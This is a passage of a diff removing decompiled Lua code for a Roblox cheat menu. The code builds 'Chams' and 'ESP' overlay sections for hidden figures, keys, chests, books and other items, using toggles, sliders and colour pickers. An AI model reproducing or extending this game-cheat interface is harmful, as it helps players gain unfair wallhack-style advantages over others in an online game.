-    local _3065 = _3056.Toggle
-    _3065(_3056, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3067, _3067_2, _3067_3)
-    end)
-    local _3068 = _3056.Toggle
-    _3068(_3056, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3070, _3070_2, _3070_3)
-    end)
-    local _3071 = _3056.Toggle
-    _3071(_3056, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3073, _3073_2, _3073_3)
-    end)
-    local _3074 = _3056.Slider
-    _3074(_3056, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3076, _3076_2, _3076_3)
-        math.floor(_3076)
-    end)
-    type(_2539)
-    local _ = _2539.r
-    local _ = _2539.g
-    local _ = _2539.b
-    local _3082 = _3056.ColorPicker
-    local _3083 = Color3.new
-    local _3084 = _3083()
-    _3082(_3056, {
-        Default = _3084,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3086, _3086_2, _3086_3)
-    end)
-    local _3087 = _2956.Section
-    local _3088 = _3087(_2956, "Eyes Chams", "Left")
-    local _3089 = _3088.Toggle
-    _3089(_3088, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3091, _3091_2, _3091_3)
-    end)
-    local _3092 = _3088.Slider
-    _3092(_3088, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3094, _3094_2, _3094_3)
-        local _3095, _3095_2, _3095_3 = math.floor(_3094)
-        local _ = _3095 / 100
-    end)
-    type(_2489)
-    local _ = _2489.r
-    local _ = _2489.g
-    local _ = _2489.b
-    local _3101 = _3088.ColorPicker
-    local _3102 = Color3.new
-    local _3103 = _3102()
-    _3101(_3088, {
-        Default = _3103,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3105, _3105_2, _3105_3)
-    end)
-    local _3106 = _3088.Slider
-    _3106(_3088, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3108, _3108_2, _3108_3)
-        local _3109, _3109_2, _3109_3 = math.floor(_3108)
-        local _ = _3109 / 100
-    end)
-    type(_2491)
-    local _ = _2491.r
-    local _ = _2491.g
-    local _ = _2491.b
-    local _3115 = _3088.ColorPicker
-    local _3116 = Color3.new
-    local _3117 = _3116()
-    _3115(_3088, {
-        Default = _3117,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3119, _3119_2, _3119_3)
-    end)
-    local _3120 = _2956.Section
-    local _3121 = _3120(_2956, "Eyes ESP", "Right")
-    local _3122 = _3121.Toggle
-    _3122(_3121, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3124, _3124_2, _3124_3)
-    end)
-    local _3125 = _3121.Slider
-    _3125(_3121, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3127, _3127_2, _3127_3)
-        local _3128, _3128_2, _3128_3 = math.floor(_3127)
-        local _ = _3128 / 100
-    end)
-    local _3130 = _3121.Toggle
-    _3130(_3121, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3132, _3132_2, _3132_3)
-    end)
-    local _3133 = _3121.Toggle
-    _3133(_3121, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3135, _3135_2, _3135_3)
-    end)
-    local _3136 = _3121.Toggle
-    _3136(_3121, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3138, _3138_2, _3138_3)
-    end)
-    local _3139 = _3121.Slider
-    _3139(_3121, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3141, _3141_2, _3141_3)
-        math.floor(_3141)
-    end)
-    type(_2541)
-    local _ = _2541.r
-    local _ = _2541.g
-    local _ = _2541.b
-    local _3147 = _3121.ColorPicker
-    local _3148 = Color3.new
-    local _3149 = _3148()
-    _3147(_3121, {
-        Default = _3149,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3151, _3151_2, _3151_3)
-    end)
-    local _3152 = _2956.Section
-    local _3153 = _3152(_2956, "Figure Chams", "Left")
-    local _3154 = _3153.Toggle
-    _3154(_3153, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3156, _3156_2, _3156_3)
-    end)
-    local _3157 = _3153.Slider
-    _3157(_3153, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3159, _3159_2, _3159_3)
-        local _3160, _3160_2, _3160_3 = math.floor(_3159)
-        local _ = _3160 / 100
-    end)
-    type(_2493)
-    local _ = _2493.r
-    local _ = _2493.g
-    local _ = _2493.b
-    local _3166 = _3153.ColorPicker
-    local _3167 = Color3.new
-    local _3168 = _3167()
-    _3166(_3153, {
-        Default = _3168,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3170, _3170_2, _3170_3)
-    end)
-    local _3171 = _3153.Slider
-    _3171(_3153, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3173, _3173_2, _3173_3)
-        local _3174, _3174_2, _3174_3 = math.floor(_3173)
-        local _ = _3174 / 100
-    end)
-    type(_2495)
-    local _ = _2495.r
-    local _ = _2495.g
-    local _ = _2495.b
-    local _3180 = _3153.ColorPicker
-    local _3181 = Color3.new
-    local _3182 = _3181()
-    _3180(_3153, {
-        Default = _3182,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3184, _3184_2, _3184_3)
-    end)
-    local _3185 = _2956.Section
-    local _3186 = _3185(_2956, "Figure ESP", "Right")
-    local _3187 = _3186.Toggle
-    _3187(_3186, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3189, _3189_2, _3189_3)
-    end)
-    local _3190 = _3186.Slider
-    _3190(_3186, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3192, _3192_2, _3192_3)
-        local _3193, _3193_2, _3193_3 = math.floor(_3192)
-        local _ = _3193 / 100
-    end)
-    local _3195 = _3186.Toggle
-    _3195(_3186, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3197, _3197_2, _3197_3)
-    end)
-    local _3198 = _3186.Toggle
-    _3198(_3186, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3200, _3200_2, _3200_3)
-    end)
-    local _3201 = _3186.Toggle
-    _3201(_3186, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3203, _3203_2, _3203_3)
-    end)
-    local _3204 = _3186.Slider
-    _3204(_3186, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3206, _3206_2, _3206_3)
-        math.floor(_3206)
-    end)
-    type(_2543)
-    local _ = _2543.r
-    local _ = _2543.g
-    local _ = _2543.b
-    local _3212 = _3186.ColorPicker
-    local _3213 = Color3.new
-    local _3214 = _3213()
-    _3212(_3186, {
-        Default = _3214,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3216, _3216_2, _3216_3)
-    end)
-    local _3217 = _2444.Button
-    local _3218 = _3217(_2444, "Items Chams & ESP", "http://www.roblox.com/asset/?id=127679279592127")
-    local _3219 = _3218.Section
-    local _3220 = _3219(_3218, "Toolshed Box Chams", "Left")
-    local _3221 = _3220.Toggle
-    _3221(_3220, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3223, _3223_2, _3223_3)
-    end)
-    local _3224 = _3220.Slider
-    _3224(_3220, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3226, _3226_2, _3226_3)
-        local _3227, _3227_2, _3227_3 = math.floor(_3226)
-        local _ = _3227 / 100
-    end)
-    type(_2497)
-    local _ = _2497.r
-    local _ = _2497.g
-    local _ = _2497.b
-    local _3233 = _3220.ColorPicker
-    local _3234 = Color3.new
-    local _3235 = _3234()
-    _3233(_3220, {
-        Default = _3235,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3237, _3237_2, _3237_3)
-    end)
-    local _3238 = _3220.Slider
-    _3238(_3220, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3240, _3240_2, _3240_3)
-        local _3241, _3241_2, _3241_3 = math.floor(_3240)
-        local _ = _3241 / 100
-    end)
-    type(_2499)
-    local _ = _2499.r
-    local _ = _2499.g
-    local _ = _2499.b
-    local _3247 = _3220.ColorPicker
-    local _3248 = Color3.new
-    local _3249 = _3248()
-    _3247(_3220, {
-        Default = _3249,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3251, _3251_2, _3251_3)
-    end)
-    local _3252 = _3218.Section
-    local _3253 = _3252(_3218, "Toolshed Box ESP", "Right")
-    local _3254 = _3253.Toggle
-    _3254(_3253, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3256, _3256_2, _3256_3)
-    end)
-    local _3257 = _3253.Slider
-    _3257(_3253, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3259, _3259_2, _3259_3)
-        local _3260, _3260_2, _3260_3 = math.floor(_3259)
-        local _ = _3260 / 100
-    end)
-    local _3262 = _3253.Toggle
-    _3262(_3253, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3264, _3264_2, _3264_3)
-    end)
-    local _3265 = _3253.Toggle
-    _3265(_3253, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3267, _3267_2, _3267_3)
-    end)
-    local _3268 = _3253.Toggle
-    _3268(_3253, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3270, _3270_2, _3270_3)
-    end)
-    local _3271 = _3253.Slider
-    _3271(_3253, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3273, _3273_2, _3273_3)
-        math.floor(_3273)
-    end)
-    type(_2571)
-    local _ = _2571.r
-    local _ = _2571.g
-    local _ = _2571.b
-    local _3279 = _3253.ColorPicker
-    local _3280 = Color3.new
-    local _3281 = _3280()
-    _3279(_3253, {
-        Default = _3281,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3283, _3283_2, _3283_3)
-    end)
-    local _3284 = _3218.Section
-    local _3285 = _3284(_3218, "Chest Chams", "Left")
-    local _3286 = _3285.Toggle
-    _3286(_3285, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3288, _3288_2, _3288_3)
-    end)
-    local _3289 = _3285.Slider
-    _3289(_3285, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3291, _3291_2, _3291_3)
-        local _3292, _3292_2, _3292_3 = math.floor(_3291)
-        local _ = _3292 / 100
-    end)
-    type(_2501)
-    local _ = _2501.r
-    local _ = _2501.g
-    local _ = _2501.b
-    local _3298 = _3285.ColorPicker
-    local _3299 = Color3.new
-    local _3300 = _3299()
-    _3298(_3285, {
-        Default = _3300,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3302, _3302_2, _3302_3)
-    end)
-    local _3303 = _3285.Slider
-    _3303(_3285, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3305, _3305_2, _3305_3)
-        local _3306, _3306_2, _3306_3 = math.floor(_3305)
-        local _ = _3306 / 100
-    end)
-    type(_2503)
-    local _ = _2503.r
-    local _ = _2503.g
-    local _ = _2503.b
-    local _3312 = _3285.ColorPicker
-    local _3313 = Color3.new
-    local _3314 = _3313()
-    _3312(_3285, {
-        Default = _3314,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3316, _3316_2, _3316_3)
-    end)
-    local _3317 = _3218.Section
-    local _3318 = _3317(_3218, "Chest ESP", "Right")
-    local _3319 = _3318.Toggle
-    _3319(_3318, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3321, _3321_2, _3321_3)
-    end)
-    local _3322 = _3318.Slider
-    _3322(_3318, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3324, _3324_2, _3324_3)
-        local _3325, _3325_2, _3325_3 = math.floor(_3324)
-        local _ = _3325 / 100
-    end)
-    local _3327 = _3318.Toggle
-    _3327(_3318, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3329, _3329_2, _3329_3)
-    end)
-    local _3330 = _3318.Toggle
-    _3330(_3318, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3332, _3332_2, _3332_3)
-    end)
-    local _3333 = _3318.Toggle
-    _3333(_3318, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3335, _3335_2, _3335_3)
-    end)
-    local _3336 = _3318.Slider
-    _3336(_3318, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3338, _3338_2, _3338_3)
-        math.floor(_3338)
-    end)
-    type(_2567)
-    local _ = _2567.r
-    local _ = _2567.g
-    local _ = _2567.b
-    local _3344 = _3318.ColorPicker
-    local _3345 = Color3.new
-    local _3346 = _3345()
-    _3344(_3318, {
-        Default = _3346,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3348, _3348_2, _3348_3)
-    end)
-    local _3349 = _3218.Section
-    local _3350 = _3349(_3218, "Locked Chest Chams", "Left")
-    local _3351 = _3350.Toggle
-    _3351(_3350, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3353, _3353_2, _3353_3)
-    end)
-    local _3354 = _3350.Slider
-    _3354(_3350, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3356, _3356_2, _3356_3)
-        local _3357, _3357_2, _3357_3 = math.floor(_3356)
-        local _ = _3357 / 100
-    end)
-    type(_2505)
-    local _ = _2505.r
-    local _ = _2505.g
-    local _ = _2505.b
-    local _3363 = _3350.ColorPicker
-    local _3364 = Color3.new
-    local _3365 = _3364()
-    _3363(_3350, {
-        Default = _3365,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3367, _3367_2, _3367_3)
-    end)
-    local _3368 = _3350.Slider
-    _3368(_3350, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3370, _3370_2, _3370_3)
-        local _3371, _3371_2, _3371_3 = math.floor(_3370)
-        local _ = _3371 / 100
-    end)
-    type(_2507)
-    local _ = _2507.r
-    local _ = _2507.g
-    local _ = _2507.b
-    local _3377 = _3350.ColorPicker
-    local _3378 = Color3.new
-    local _3379 = _3378()
-    _3377(_3350, {
-        Default = _3379,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3381, _3381_2, _3381_3)
-    end)
-    local _3382 = _3218.Section
-    local _3383 = _3382(_3218, "Locked Chest ESP", "Right")
-    local _3384 = _3383.Toggle
-    _3384(_3383, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3386, _3386_2, _3386_3)
-    end)
-    local _3387 = _3383.Slider
-    _3387(_3383, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3389, _3389_2, _3389_3)
-        local _3390, _3390_2, _3390_3 = math.floor(_3389)
-        local _ = _3390 / 100
-    end)
-    local _3392 = _3383.Toggle
-    _3392(_3383, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3394, _3394_2, _3394_3)
-    end)
-    local _3395 = _3383.Toggle
-    _3395(_3383, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3397, _3397_2, _3397_3)
-    end)
-    local _3398 = _3383.Toggle
-    _3398(_3383, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3400, _3400_2, _3400_3)
-    end)
-    local _3401 = _3383.Slider
-    _3401(_3383, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3403, _3403_2, _3403_3)
-        math.floor(_3403)
-    end)
-    type(_2569)
-    local _ = _2569.r
-    local _ = _2569.g
-    local _ = _2569.b
-    local _3409 = _3383.ColorPicker
-    local _3410 = Color3.new
-    local _3411 = _3410()
-    _3409(_3383, {
-        Default = _3411,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3413, _3413_2, _3413_3)
-    end)
-    local _3414 = _3218.Section
-    local _3415 = _3414(_3218, "Key Chams", "Left")
-    local _3416 = _3415.Toggle
-    _3416(_3415, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3418, _3418_2, _3418_3)
-    end)
-    local _3419 = _3415.Slider
-    _3419(_3415, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3421, _3421_2, _3421_3)
-        local _3422, _3422_2, _3422_3 = math.floor(_3421)
-        local _ = _3422 / 100
-    end)
-    type(_2509)
-    local _ = _2509.r
-    local _ = _2509.g
-    local _ = _2509.b
-    local _3428 = _3415.ColorPicker
-    local _3429 = Color3.new
-    local _3430 = _3429()
-    _3428(_3415, {
-        Default = _3430,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3432, _3432_2, _3432_3)
-    end)
-    local _3433 = _3415.Slider
-    _3433(_3415, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3435, _3435_2, _3435_3)
-        local _3436, _3436_2, _3436_3 = math.floor(_3435)
-        local _ = _3436 / 100
-    end)
-    type(_2511)
-    local _ = _2511.r
-    local _ = _2511.g
-    local _ = _2511.b
-    local _3442 = _3415.ColorPicker
-    local _3443 = Color3.new
-    local _3444 = _3443()
-    _3442(_3415, {
-        Default = _3444,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3446, _3446_2, _3446_3)
-    end)
-    local _3447 = _3218.Section
-    local _3448 = _3447(_3218, "Key ESP", "Right")
-    local _3449 = _3448.Toggle
-    _3449(_3448, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3451, _3451_2, _3451_3)
-    end)
-    local _3452 = _3448.Slider
-    _3452(_3448, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3454, _3454_2, _3454_3)
-        local _3455, _3455_2, _3455_3 = math.floor(_3454)
-        local _ = _3455 / 100
-    end)
-    local _3457 = _3448.Toggle
-    _3457(_3448, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3459, _3459_2, _3459_3)
-    end)
-    local _3460 = _3448.Toggle
-    _3460(_3448, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3462, _3462_2, _3462_3)
-    end)
-    local _3463 = _3448.Toggle
-    _3463(_3448, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3465, _3465_2, _3465_3)
-    end)
-    local _3466 = _3448.Slider
-    _3466(_3448, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3468, _3468_2, _3468_3)
-        math.floor(_3468)
-    end)
-    type(_2555)
-    local _ = _2555.r
-    local _ = _2555.g
-    local _ = _2555.b
-    local _3474 = _3448.ColorPicker
-    local _3475 = Color3.new
-    local _3476 = _3475()
-    _3474(_3448, {
-        Default = _3476,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3478, _3478_2, _3478_3)
-    end)
-    local _3479 = _3218.Section
-    local _3480 = _3479(_3218, "Book Chams", "Left")
-    local _3481 = _3480.Toggle
-    _3481(_3480, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3483, _3483_2, _3483_3)
-    end)
-    local _3484 = _3480.Slider
-    _3484(_3480, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3486, _3486_2, _3486_3)
-        local _3487, _3487_2, _3487_3 = math.floor(_3486)
-        local _ = _3487 / 100
-    end)
-    type(_2513)
-    local _ = _2513.r
-    local _ = _2513.g
-    local _ = _2513.b
-    local _3493 = _3480.ColorPicker
-    local _3494 = Color3.new
-    local _3495 = _3494()
-    _3493(_3480, {
-        Default = _3495,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3497, _3497_2, _3497_3)
-    end)
-    local _3498 = _3480.Slider
-    _3498(_3480, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3500, _3500_2, _3500_3)
-        local _3501, _3501_2, _3501_3 = math.floor(_3500)
-        local _ = _3501 / 100
-    end)
-    type(_2515)
-    local _ = _2515.r
-    local _ = _2515.g
-    local _ = _2515.b
-    local _3507 = _3480.ColorPicker
-    local _3508 = Color3.new
-    local _3509 = _3508()
-    _3507(_3480, {
-        Default = _3509,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3511, _3511_2, _3511_3)
-    end)
-    local _3512 = _3218.Section
-    local _3513 = _3512(_3218, "Book ESP", "Right")
-    local _3514 = _3513.Toggle
-    _3514(_3513, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3516, _3516_2, _3516_3)
-    end)
-    local _3517 = _3513.Slider
-    _3517(_3513, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3519, _3519_2, _3519_3)
-        local _3520, _3520_2, _3520_3 = math.floor(_3519)
-        local _ = _3520 / 100
-    end)
-    local _3522 = _3513.Toggle
-    _3522(_3513, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3524, _3524_2, _3524_3)
-    end)
-    local _3525 = _3513.Toggle
-    _3525(_3513, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3527, _3527_2, _3527_3)
-    end)
-    local _3528 = _3513.Toggle
-    _3528(_3513, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3530, _3530_2, _3530_3)
-    end)
-    local _3531 = _3513.Slider
-    _3531(_3513, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3533, _3533_2, _3533_3)
-        math.floor(_3533)
-    end)
-    type(_2557)
-    local _ = _2557.r
-    local _ = _2557.g
-    local _ = _2557.b
-    local _3539 = _3513.ColorPicker
-    local _3540 = Color3.new
-    local _3541 = _3540()
-    _3539(_3513, {
-        Default = _3541,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3543, _3543_2, _3543_3)
-    end)
-    local _3544 = _3218.Section
-    local _3545 = _3544(_3218, "Breaker Chams", "Left")
-    local _3546 = _3545.Toggle
-    _3546(_3545, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3548, _3548_2, _3548_3)
-    end)
-    local _3549 = _3545.Slider
-    _3549(_3545, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3551, _3551_2, _3551_3)
-        local _3552, _3552_2, _3552_3 = math.floor(_3551)
-        local _ = _3552 / 100
-    end)
-    type(_2533)
-    local _ = _2533.r
-    local _ = _2533.g
-    local _ = _2533.b
-    local _3558 = _3545.ColorPicker
-    local _3559 = Color3.new
-    local _3560 = _3559()
-    _3558(_3545, {
-        Default = _3560,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3562, _3562_2, _3562_3)
-    end)
-    local _3563 = _3545.Slider
-    _3563(_3545, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3565, _3565_2, _3565_3)
-        local _3566, _3566_2, _3566_3 = math.floor(_3565)
-        local _ = _3566 / 100
-    end)
-    type(_2535)
-    local _ = _2535.r
-    local _ = _2535.g
-    local _ = _2535.b
-    local _3572 = _3545.ColorPicker
-    local _3573 = Color3.new
-    local _3574 = _3573()
-    _3572(_3545, {
-        Default = _3574,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3576, _3576_2, _3576_3)
-    end)
-    local _3577 = _3218.Section
-    local _3578 = _3577(_3218, "Breaker ESP", "Right")
-    local _3579 = _3578.Toggle
-    _3579(_3578, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3581, _3581_2, _3581_3)
-    end)
-    local _3582 = _3578.Slider
-    _3582(_3578, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3584, _3584_2, _3584_3)
-        local _3585, _3585_2, _3585_3 = math.floor(_3584)
-        local _ = _3585 / 100
-    end)
-    local _3587 = _3578.Toggle
-    _3587(_3578, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3589, _3589_2, _3589_3)
-    end)
-    local _3590 = _3578.Toggle
-    _3590(_3578, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3592, _3592_2, _3592_3)
-    end)
-    local _3593 = _3578.Toggle
-    _3593(_3578, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3595, _3595_2, _3595_3)
-    end)
-    local _3596 = _3578.Slider
-    _3596(_3578, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3598, _3598_2, _3598_3)
-        math.floor(_3598)
-    end)
-    type(_2565)
-    local _ = _2565.r
-    local _ = _2565.g
-    local _ = _2565.b
-    local _3604 = _3578.ColorPicker
-    local _3605 = Color3.new
-    local _3606 = _3605()
-    _3604(_3578, {
-        Default = _3606,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3608, _3608_2, _3608_3)
-    end)
-    local _3609 = _3218.Section
-    local _3610 = _3609(_3218, "Lighter Chams", "Left")
-    local _3611 = _3610.Toggle
-    _3611(_3610, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3613, _3613_2, _3613_3)
-    end)
-    local _3614 = _3610.Slider
-    _3614(_3610, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3616, _3616_2, _3616_3)
-        local _3617, _3617_2, _3617_3 = math.floor(_3616)
-        local _ = _3617 / 100
-    end)
-    type(_2529)
-    local _ = _2529.r
-    local _ = _2529.g
-    local _ = _2529.b
-    local _3623 = _3610.ColorPicker
-    local _3624 = Color3.new
-    local _3625 = _3624()
-    _3623(_3610, {
-        Default = _3625,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3627, _3627_2, _3627_3)
-    end)
-    local _3628 = _3610.Slider
-    _3628(_3610, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3630, _3630_2, _3630_3)
-        local _3631, _3631_2, _3631_3 = math.floor(_3630)
-        local _ = _3631 / 100
-    end)
-    type(_2531)
-    local _ = _2531.r
-    local _ = _2531.g
-    local _ = _2531.b
-    local _3637 = _3610.ColorPicker
-    local _3638 = Color3.new
-    local _3639 = _3638()
-    _3637(_3610, {
-        Default = _3639,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3641, _3641_2, _3641_3)
-    end)
-    local _3642 = _3218.Section
-    local _3643 = _3642(_3218, "Lighter ESP", "Right")
-    local _3644 = _3643.Toggle
-    _3644(_3643, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3646, _3646_2, _3646_3)
-    end)
-    local _3647 = _3643.Slider
-    _3647(_3643, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3649, _3649_2, _3649_3)
-        local _3650, _3650_2, _3650_3 = math.floor(_3649)
-        local _ = _3650 / 100
-    end)
-    local _3652 = _3643.Toggle
-    _3652(_3643, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3654, _3654_2, _3654_3)
-    end)
-    local _3655 = _3643.Toggle
-    _3655(_3643, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3657, _3657_2, _3657_3)
-    end)
-    local _3658 = _3643.Toggle
-    _3658(_3643, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3660, _3660_2, _3660_3)
-    end)
-    local _3661 = _3643.Slider
-    _3661(_3643, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3663, _3663_2, _3663_3)
-        math.floor(_3663)
-    end)
-    type(_2563)
-    local _ = _2563.r
-    local _ = _2563.g
-    local _ = _2563.b
-    local _3669 = _3643.ColorPicker
-    local _3670 = Color3.new
-    local _3671 = _3670()
-    _3669(_3643, {
-        Default = _3671,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3673, _3673_2, _3673_3)
-    end)
-    local _3674 = _3218.Section
-    local _3675 = _3674(_3218, "Battery Chams", "Left")
-    local _3676 = _3675.Toggle
-    _3676(_3675, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3678, _3678_2, _3678_3)
-    end)
-    local _3679 = _3675.Slider
-    _3679(_3675, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3681, _3681_2, _3681_3)
-        local _3682, _3682_2, _3682_3 = math.floor(_3681)
-        local _ = _3682 / 100
-    end)
-    type(_2525)
-    local _ = _2525.r
-    local _ = _2525.g
-    local _ = _2525.b
